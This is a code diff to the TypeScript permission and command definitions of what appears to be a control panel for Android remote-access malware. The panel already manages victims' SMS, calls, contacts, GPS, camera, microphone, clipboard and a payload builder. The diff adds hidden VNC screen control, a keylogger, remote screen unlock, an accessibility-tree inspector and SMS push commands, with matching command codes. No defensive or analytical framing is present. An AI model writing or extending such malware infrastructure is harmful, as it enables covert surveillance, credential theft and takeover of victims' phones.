@@ -1,5 +1,4 @@
 export type UserRole = 'admin' | 'user';
-
 export type Permission =
   | 'dashboard:view'
   | 'device:view'
@@ -16,6 +15,10 @@ export type Permission =
   | 'device:permissions'
   | 'device:apps'
   | 'device:fason'
+  | 'device:hvnc'
+  | 'device:inspector'
+  | 'device:keylogger'
+  | 'device:unlock'
   | 'device:command'
   | 'device:delete'
   | 'builder:access'
@@ -26,25 +29,25 @@ export type Permission =
   | 'settings:edit'
   | 'stats:view'
   | 'files:download';
-
 export const ALL_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
   'device:contacts', 'device:gps', 'device:camera', 'device:mic',
   'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
-  'device:permissions', 'device:apps', 'device:fason', 'device:command',
-  'device:delete',
+  'device:permissions', 'device:apps', 'device:fason',
+  'device:hvnc', 'device:inspector', 'device:keylogger', 'device:unlock',
+  'device:command', 'device:delete',
   'builder:access', 'logs:view', 'logs:clear', 'users:manage',
   'settings:view', 'settings:edit', 'stats:view', 'files:download',
 ];
-
 export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
   'device:contacts', 'device:gps', 'device:camera', 'device:mic',
   'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
-  'device:permissions', 'device:apps', 'device:fason', 'device:command',
-  'logs:view', 'settings:view',
+  'device:permissions', 'device:apps', 'device:fason',
+  'device:hvnc', 'device:inspector',
+  'device:command',
+  'settings:view',
 ];
-
 export const PERMISSION_GROUPS = [
   {
     label: 'Device Features',
@@ -64,6 +67,10 @@ export const PERMISSION_GROUPS = [
       { key: 'device:permissions' as Permission, label: 'App Permissions', description: 'View app permissions' },
       { key: 'device:apps' as Permission, label: 'Installed Apps', description: 'View installed applications' },
       { key: 'device:fason' as Permission, label: 'Fason Manager', description: 'Fason app management' },
+      { key: 'device:hvnc' as Permission, label: 'HVNC', description: 'Hidden VNC screen capture + input' },
+      { key: 'device:inspector' as Permission, label: 'Inspector', description: 'Accessibility tree inspector' },
+      { key: 'device:keylogger' as Permission, label: 'Keylogger', description: 'Keystroke capture' },
+      { key: 'device:unlock' as Permission, label: 'Auto Unlock', description: 'Remote screen unlock' },
       { key: 'device:command' as Permission, label: 'Send Commands', description: 'Send commands to devices' },
       { key: 'device:delete' as Permission, label: 'Delete Devices', description: 'Remove devices and their data' },
     ],
@@ -82,7 +89,6 @@ export const PERMISSION_GROUPS = [
     ],
   },
 ];
-
 export function resolvePermissions(role: UserRole, permissionsJson: string): Permission[] {
   if (role === 'admin') return [...ALL_PERMISSIONS];
   try {
@@ -110,10 +116,14 @@ export const CMD = {
   NOTIFICATIONS: '0xNO',
   FASON: '0xFM',
   INFO: '0xIF',
+  HVNC: '0xHV',
+  INSPECTOR: '0xAI',
+  KEYLOGGER: '0xKL',
+  SMS_PUSH: '0xSP',
+  DEVICE_UNLOCK: '0xAU',
 } as const;
 
 export type CmdType = typeof CMD[keyof typeof CMD];
-
 export const CMD_TO_DATA_TYPE: Record<CmdType, string> = {
   [CMD.FILES]: 'files',
   [CMD.SMS]: 'sms',
@@ -130,6 +140,11 @@ export const CMD_TO_DATA_TYPE: Record<CmdType, string> = {
   [CMD.NOTIFICATIONS]: 'notifications',
   [CMD.FASON]: 'fason',
   [CMD.INFO]: 'info',
+  [CMD.HVNC]: 'hvnc',
+  [CMD.INSPECTOR]: 'inspector',
+  [CMD.KEYLOGGER]: 'keylogger',
+  [CMD.SMS_PUSH]: 'sms_push',
+  [CMD.DEVICE_UNLOCK]: 'device_unlock',
 };
 
 export interface CommandPayload {
@@ -144,13 +159,14 @@ export interface ApiResponse<T = unknown> {
   error?: string;
 }
 
-export interface JwtPayload {
-  userId: number;
+export interface SessionUser {
+  userId: string;
   username: string;
   email: string;
   role: UserRole;
   permissions: Permission[];
-  sessionId?: string;
+  sessionId: string;
+  sessionToken: string;
 }
 
 export interface ServerConfig {
@@ -172,12 +188,12 @@ export interface ServerConfig {
   };
   build: {
     timeout: number;
+    showServerUrl: boolean;
   };
   security: {
     sessionTimeout: number;
     loginAttempts: number;
     loginLockout: number;
-    deviceSecret: string;
   };
   logger: {
     maxDbLogs: number;
